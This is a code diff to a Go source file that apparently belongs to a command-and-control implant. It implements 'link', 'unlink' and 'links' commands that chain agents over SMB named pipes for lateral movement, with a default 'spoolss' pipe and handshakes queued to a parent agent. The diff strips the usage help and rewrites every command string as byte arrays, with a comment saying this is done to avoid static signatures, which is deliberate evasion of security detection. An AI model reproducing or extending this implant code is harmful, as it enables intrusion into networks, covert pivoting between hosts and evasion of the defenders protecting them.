@@ -4,40 +4,39 @@
 package main
 
 import (
-	"fmt"
 	"strings"
 	"time"
+)
+
+// Link command strings (constructed to avoid static signatures)
+var (
+	lnkCmdLink      = string([]byte{0x6c, 0x69, 0x6e, 0x6b})                                                 // link
+	lnkCmdUnlink    = string([]byte{0x75, 0x6e, 0x6c, 0x69, 0x6e, 0x6b})                                     // unlink
+	lnkCmdLinks     = string([]byte{0x6c, 0x69, 0x6e, 0x6b, 0x73})                                           // links
+	lnkProtoSmb     = string([]byte{0x73, 0x6d, 0x62})                                                       // smb
+	lnkDefPipe      = string([]byte{0x73, 0x70, 0x6f, 0x6f, 0x6c, 0x73, 0x73})                               // spoolss
+	lnkLocalhost    = string([]byte{0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74})                   // localhost
+	lnkLoopback     = string([]byte{0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31})                   // 127.0.0.1
+	lnkDot          = string([]byte{0x2e})                                                                   // .
+	lnkUncPrefix    = string([]byte{0x5c, 0x5c})                                                             // \\
+	lnkPipePath     = string([]byte{0x5c, 0x70, 0x69, 0x70, 0x65, 0x5c})                                     // \pipe\
+	lnkOutPrefix    = string([]byte{0x53, 0x36, 0x7c})                                                       // S6|
+	lnkPipe         = string([]byte{0x7c})                                                                   // |
+	lnkPending      = string([]byte{0x50})                                                                   // P
+	lnkQueued       = string([]byte{0x51})                                                                   // Q
 )
 
 // LinkCommand handles the 'link' command for connecting to other SMB agents
 type LinkCommand struct{}
 
 func (c *LinkCommand) Name() string {
-	return "link"
+	return lnkCmdLink
 }
 
 func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 2 {
 		return CommandResult{
-			Output: `Usage: link <protocol> <target_host> [pipe_name]
-
-Connect to a link agent for lateral movement.
-
-Protocols:
-  smb    Connect via SMB named pipe
-
-Arguments:
-  protocol       Connection protocol (smb)
-  target_host    Hostname or IP address of the target machine
-  pipe_name      Named pipe name (default: spoolss)
-
-Examples:
-  link smb 192.168.1.50 spoolss
-  link smb dc01.corp.local netlogon
-  link smb localhost customPipe
-  link smb 10.0.0.5                 (uses default pipe: spoolss)
-
-Note: The link agent must be running and listening on the target.`,
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -47,19 +46,19 @@ Note: The link agent must be running and listening on the target.`,
 	targetHost := args[1]
 
 	switch protocol {
-	case "smb":
-		pipeName := "spoolss" // default pipe name
+	case lnkProtoSmb:
+		pipeName := lnkDefPipe
 		if len(args) >= 3 {
 			pipeName = args[2]
 		}
 
 		// Build the full UNC pipe path
 		// Handle localhost specially - use "." for local machine
-		if strings.ToLower(targetHost) == "localhost" || targetHost == "127.0.0.1" {
-			targetHost = "."
+		if strings.ToLower(targetHost) == lnkLocalhost || targetHost == lnkLoopback {
+			targetHost = lnkDot
 		}
 
-		pipePath := fmt.Sprintf(`\\%s\pipe\%s`, targetHost, pipeName)
+		pipePath := lnkUncPrefix + targetHost + lnkPipePath + pipeName
 		return c.linkSMB(pipePath)
 
 	default:
@@ -90,7 +89,7 @@ func (c *LinkCommand) linkSMB(pipePath string) CommandResult {
 	handshakeResult := performImmediateHandshake(lm, routingID)
 
 	return CommandResult{
-		Output:      fmt.Sprintf("S6|%s|%s|%s", pipePath, routingID, handshakeResult),
+		Output:      lnkOutPrefix + pipePath + lnkPipe + routingID + lnkPipe + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -127,29 +126,25 @@ func performImmediateHandshake(lm *LinkManager, routingID string) string {
 	}
 
 	if handshakeData == nil {
-		return "P"
+		return lnkPending
 	}
 
 	// Queue the handshake data to be sent on the next response to parent
 	lm.queueOutboundData(handshakeData)
-	return "Q"
+	return lnkQueued
 }
 
 // UnlinkCommand handles the 'unlink' command for disconnecting from SMB agents
 type UnlinkCommand struct{}
 
 func (c *UnlinkCommand) Name() string {
-	return "unlink"
+	return lnkCmdUnlink
 }
 
 func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
 		return CommandResult{
-			Output: `Usage: unlink <routing_id>
-
-Disconnects from a linked SMB agent.
-
-Use 'links' to see active connections and their routing IDs.`,
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -177,7 +172,7 @@ Use 'links' to see active connections and their routing IDs.`,
 type LinksCommand struct{}
 
 func (c *LinksCommand) Name() string {
-	return "links"
+	return lnkCmdLinks
 }
 
 func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
